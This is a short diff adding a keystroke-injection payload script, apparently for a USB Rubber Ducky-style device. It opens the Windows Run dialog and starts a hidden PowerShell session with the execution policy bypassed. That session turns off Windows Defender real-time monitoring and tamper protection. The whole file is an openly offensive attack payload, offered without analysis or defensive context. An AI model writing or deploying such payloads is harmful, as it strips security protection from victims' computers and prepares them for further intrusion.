@@ -1,0 +1,6 @@
+REM Disable Windows Defender
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -NoP -NonI -Ep Bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableTamperProtection $true"
+ENTER
